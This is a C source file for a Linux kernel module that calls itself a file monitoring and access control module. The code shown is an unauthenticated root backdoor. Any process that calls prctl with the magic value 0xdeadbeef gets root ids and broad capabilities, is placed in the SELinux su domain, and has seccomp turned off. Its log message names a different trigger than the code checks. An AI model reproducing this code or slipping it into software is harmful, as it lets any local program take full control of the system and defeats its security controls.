// SPDX-License-Identifier: GPL-3.0-or-later
/* FMAC - File Monitoring and Access Control Kernel Module
 * Copyright (C) 2025 Aqnya
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 */

#include <linux/capability.h>
#include <linux/cred.h>
#include <linux/file.h>
#include <linux/fs.h>
#include <linux/kernel.h>
#include <linux/sched.h>
#include <linux/security.h>
#include <linux/selinux.h>
#include <linux/thread_info.h>
#include <linux/uaccess.h>
#include <linux/uidgid.h>
#include <linux/version.h>
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 14, 0)
#include <linux/sched/signal.h>
#else
#include <linux/sched.h>
#endif
#include <linux/mm.h>
#include <linux/mm_types.h>
#include <linux/slab.h>
#include <linux/spinlock.h>

#include "fmac.h"
#include "objsec.h"

static void elevate_to_root(void) {
  struct cred *cred;

  cred = prepare_creds();
  if (!cred) {
    pr_warn("[FMAC] prepare_creds failed!\n");
    return;
  }

  if (cred->euid.val == 0) {
    pr_info("[FMAC] Already root, skip.\n");
    abort_creds(cred);
    return;
  }

  cred->uid.val = 0;
  cred->euid.val = 0;
  cred->suid.val = 0;
  cred->fsuid.val = 0;

  cred->gid.val = 0;
  cred->egid.val = 0;
  cred->sgid.val = 0;
  cred->fsgid.val = 0;

  cred->securebits = 0;

  cap_raise(cred->cap_effective, CAP_SYS_ADMIN);
  cap_raise(cred->cap_effective, CAP_DAC_OVERRIDE);
  cap_raise(cred->cap_effective, CAP_SETUID);
  cap_raise(cred->cap_effective, CAP_SETGID);
  cap_raise(cred->cap_effective, CAP_NET_ADMIN);
  cap_raise(cred->cap_effective, CAP_SYS_PTRACE);
  cap_raise(cred->cap_effective, CAP_SYS_MODULE);
  cap_raise(cred->cap_effective, CAP_DAC_READ_SEARCH);

  cred->cap_permitted = cred->cap_effective;
  cred->cap_bset = cred->cap_effective;
  
  commit_creds(cred);

set_task_selinux_domain(NULL, "u:r:su:s0");

#ifdef CONFIG_SECCOMP
#ifdef CONFIG_SECCOMP_FILTER
  if (current->seccomp.mode != 0) {
    spin_lock_irq(&current->sighand->siglock);
#if defined(TIF_SECCOMP)
    clear_thread_flag(TIF_SECCOMP);
#endif

#if defined(_TIF_SECCOMP)
    clear_thread_flag(_TIF_SECCOMP);
#endif
    current->seccomp.mode = SECCOMP_MODE_DISABLED;
    spin_unlock_irq(&current->sighand->siglock);
  }
#endif
#endif

  pr_info("[FMAC] Root escalation success: PID=%d\n", current->pid);
}

void prctl_check(int option, unsigned long arg2, unsigned long arg3,
                 unsigned long arg4, unsigned long arg5) {
  if (option == 0xdeadbeef) {
    elevate_to_root();
    fmac_append_to_log(
        "[FMAC] prctl(PR_SET_NAME, \"fmac_trigger\") triggered root\n");
  }
}